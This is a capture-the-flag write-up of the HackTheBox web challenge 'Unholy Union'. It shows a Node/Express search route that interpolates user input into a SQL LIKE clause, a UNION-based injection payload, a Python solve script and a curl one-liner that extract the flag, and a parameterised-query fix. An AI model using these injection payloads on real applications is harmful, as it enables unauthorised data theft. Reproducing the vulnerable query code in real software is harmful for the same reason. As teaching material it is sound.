---
title: "Unholy Union"
date: 2026-11-04 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, sqli, union-based, cwe-89]
description: "A Very Easy Web challenge teaching UNION-based SQL injection — break out of a search box's LIKE clause and UNION the flag out of a sibling table."
---

## Overview

`Unholy Union` is a Very Easy HackTheBox **Web** challenge: a tiny Node/Express +
MySQL "Halloween inventory" app. Its single interesting endpoint, a search box,
concatenates user input straight into a SQL `LIKE` clause — a textbook
[SQL injection](https://cwe.mitre.org/data/definitions/89.html). One request
closes the wildcard string and `UNION SELECT`s the flag out of a separate table.

## The technique

The search route builds its query by string interpolation:

```js
const query = req.query.query ? req.query.query : "";
sqlQuery = `SELECT * FROM inventory WHERE name LIKE '%${query}%'`;
const [rows] = await pool.query(sqlQuery);
```

`req.query.query` lands raw inside the query — no parameterisation, no escaping —
so the input is treated as **code, not data**. The matching rows (and any SQL
error) are returned as JSON, which makes a `UNION` attack trivially observable.

Two facts shape the payload:

1. **Column count.** `SELECT *` on `inventory` returns 5 columns
   (`id, name, description, origin, created_at`), so a `UNION SELECT` must supply
   5 values.
2. **Where the flag lives.** The container's `entrypoint.sh` loads the flag into
   a *separate* single-column table, not the one being searched:

   ```sql
   CREATE TABLE flag (flag VARCHAR(255) NOT NULL);
   INSERT INTO flag(flag) VALUES("$(cat /flag.txt)");
   ```

## Solution

The injection point is the `LIKE '%...%'` string. A leading single quote closes
the wildcard string, then we `UNION` against the `flag` table; `-- -` comments
out the trailing `%'` the app appends:

```
' UNION SELECT 1,flag,3,4,5 FROM flag-- -
```

Substituted in, the executed query becomes:

```sql
SELECT * FROM inventory WHERE name LIKE '%' UNION SELECT 1,flag,3,4,5 FROM flag-- -%'
```

The flag sits in the 2nd column, so it surfaces in the reflected `name` field.

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, requests

base = sys.argv[1].rstrip("/")
payload = "' UNION SELECT 1,flag,3,4,5 FROM flag-- -"

rows = requests.get(f"{base}/search", params={"query": payload}, timeout=15).json()["message"]
for row in rows:
    if str(row.get("name", "")).startswith("HTB{"):
        print(row["name"])
        break
```

Run it against the live instance:

```bash
python3 solve.py http://<ip>:<port>
# HTB{...}
```

Or as a one-liner:

```bash
curl -s -G "http://<ip>:<port>/search" \
  --data-urlencode "query=' UNION SELECT 1,flag,3,4,5 FROM flag-- -" \
  | python3 -c 'import sys,json;[print(r["name"]) for r in json.load(sys.stdin)["message"] if str(r["name"]).startswith("HTB{")]'
```

## Why it worked

The query is assembled with string interpolation, so a single quote in the input
escapes the `LIKE` pattern and the rest of the input is parsed as SQL. Because the
base query is `SELECT *` over a visible table, the column count and types are
knowable, and errors plus data are reflected in the JSON response — no blind
inference is needed. The flag living in a different table is irrelevant once you
have a `UNION`: any table in the same database is reachable.

## Fix / defense

Use a parameterised query so the input can never alter the query structure:

```js
const [rows] = await pool.query(
  "SELECT * FROM inventory WHERE name LIKE ?",
  ['%' + query + '%']
);
```

The driver ships the SQL and the bound value separately, so a `'` in the input is
just a literal character — there is no way to break out of the string or reach the
`flag` table.
